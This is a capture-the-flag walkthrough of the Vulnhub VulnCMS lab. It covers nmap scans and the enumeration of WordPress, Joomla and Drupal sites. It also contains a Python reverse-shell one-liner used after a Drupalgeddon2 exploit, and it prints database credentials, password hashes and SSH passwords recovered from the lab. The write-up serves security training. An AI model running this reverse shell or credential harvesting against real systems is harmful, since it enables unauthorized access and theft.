# VulnCMS Vulnhub Walkthrough

## All Ports Scan

```bash
# Nmap 7.91 scan initiated Tue Jun 15 21:11:41 2021 as: nmap -T4 -vv -sT -p- -oA nmap/allports 192.168.1.51
Nmap scan report for 192.168.1.51
Host is up, received arp-response (0.00018s latency).
Scanned at 2021-06-15 21:11:41 EDT for 2s
Not shown: 65530 closed ports
Reason: 65530 conn-refused
PORT     STATE SERVICE         REASON
22/tcp   open  ssh             syn-ack
80/tcp   open  http            syn-ack
5000/tcp open  upnp            syn-ack
8081/tcp open  blackice-icecap syn-ack
9001/tcp open  tor-orport      syn-ack
MAC Address: 08:00:27:3C:22:7A (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Jun 15 21:11:43 2021 -- 1 IP address (1 host up) scanned in 2.09 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Tue Jun 15 21:12:00 2021 as: nmap -T4 -sT -sV -sC -A -p- -oA nmap/complete 192.168.1.51
Nmap scan report for 192.168.1.51
Host is up (0.00058s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 (RSA)
|   256 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 (ECDSA)
|_  256 fa:c9:eb:58:e3:d2:b7:4a:74:77:fc:69:0e:b6:68:08 (ED25519)
80/tcp   open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: W3.CSS Template
5000/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: WordPress 5.7.2
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: fsociety &#8211; Just another WordPress site
8081/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Home
9001/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: fsociety.web
MAC Address: 08:00:27:3C:22:7A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.1.51

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 15 21:12:22 2021 -- 1 IP address (1 host up) scanned in 23.09 seconds
```

## Port 80 Enumeration

Nothing more only default running website.

![](Images/Pasted%20image%2020210615211854.png)

While looking into robots.txt got 2 entries.

![](Images/Pasted%20image%2020210615215907.png)

Got a message

![](Images/Pasted%20image%2020210615220007.png)

## Port 5000 Enumeration

Website binded with a domain 

![](Images/Pasted%20image%2020210615211534.png)

While Looking for website got the location

![](Images/Pasted%20image%2020210615215625.png)

```bash
Username : wordpress_admin
/var/www/html/wordpress/public\_html/wp-content/themes/twentytwentyone/index.php
```

## Port 8081 Enumeration

![](Images/Pasted%20image%2020210615213806.png)

## Port 9001 Enumeration

![](Images/Pasted%20image%2020210615213714.png)

```bash
Username : admin_cms_drupal
```

![](Images/Pasted%20image%2020210615224201.png)

https://github.com/dreadlocked/Drupalgeddon2

![](Images/Pasted%20image%2020210615224241.png)

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![](Images/Pasted%20image%2020210615224716.png)

![](Images/Pasted%20image%2020210615225158.png)

```java
Wordpress : 
define( 'DB_NAME', 'wordpress_db' );
/** MySQL database username */
define( 'DB_USER', 'wp_admin' );
/** MySQL database password */
define( 'DB_PASSWORD', 'UUs3R_C!B@p@55' );
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

Drupal : 
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal_db',
      'username' => 'drupal_admin',
      'password' => 'p@$$_C!rUP@!_cM5',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

Joomla : 
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'joomla_admin';
	public $password = 'j00m1_@_dBpA$$';
	public $db = 'joomla_db';

```

![](Images/Pasted%20image%2020210615225559.png)

![](Images/Pasted%20image%2020210615225719.png)

![](Images/Pasted%20image%2020210615232337.png)

```bash
+----+------------+-----------------+-------------------------+--------------------------------------------------------------+
| id | name       | username        | email                   | password                                                     |
+----+------------+-----------------+-------------------------+--------------------------------------------------------------+
| 46 | Super User | joomlaCMS_admin | Fluntence54@armyspy.com | $2y$10$EYc6SKfMLzlLE/IcD9a6XeAe2Uv7WTBFlbbqRrnpht1K0M1bLrWee |
| 47 | elliot     | elliot          | 5T3e!_M0un7i@N          | $2y$10$jddnEQpjriJX9jPxh6C/hOag4ZZXae4iVhL7GVRPC9SHWgqbi4SYy |
+----+------------+-----------------+-------------------------+--------------------------------------------------------------+
```

```bash
Credentials : 
SSH
Username : elliot
Password : 5T3e!_M0un7i@N
Username : tyrell
Password : mR_R0bo7_i5_R3@!_

Username: joomlaCMS_admin
Password: _q4gWWJuBWt8cqfbUm-cdevR?L@N7-pR
```
![](Images/Pasted%20image%2020210615232544.png)

![](Images/Pasted%20image%2020210615235234.png)

![](Images/Pasted%20image%2020210616141517.png)

![](Images/Pasted%20image%2020210616141737.png)

![](Images/Pasted%20image%2020210616142005.png)

![](Images/Pasted%20image%2020210616142047.png)